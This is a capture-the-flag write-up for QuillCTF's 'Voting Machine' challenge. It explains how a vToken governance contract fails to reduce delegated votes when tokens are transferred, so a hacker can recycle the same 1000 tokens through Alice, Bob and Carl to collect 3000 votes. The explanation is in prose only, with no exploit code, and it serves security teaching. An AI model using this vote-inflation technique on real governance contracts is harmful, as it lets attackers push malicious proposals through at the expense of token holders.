# QuillCTF : Voting Machine

## Object of CTF
vToken is a governance token that allows holders to vote on proposals for the community. As a hacker, you have proposed a malicious proposal and now you need 3000 votes to get it accepted in your favor. Hacker has access to private keys of three other users i.e, Alice, Bob and Carl. Alice has 1000 vTokens but Bob and Carl has none.
Goal here is to get 3000 votes for hacker and also a balance of 1000 vTokens.

## Vulnerability Of VotingMachine Smart Contract
Vulnerability lies in the fact that the vToken Smart Contract does not update deligates voting rights upon the transfer of vTokens. So if let's say Alice has 1000 vTokens and she deligates the hacker. The hacker in this case will have a 1000 voting rights. Now if Alice's tokens are transfered to let's say Bob, ideally deligates voting rights should be reduced by the same amount transfered to Bob but that is not happening. So, if now Bob delegates Hacker, hacker will then have voting rights increased by the amount of vTokens Bob has. And hence these voting rights are created from thin air without extra vTokens.
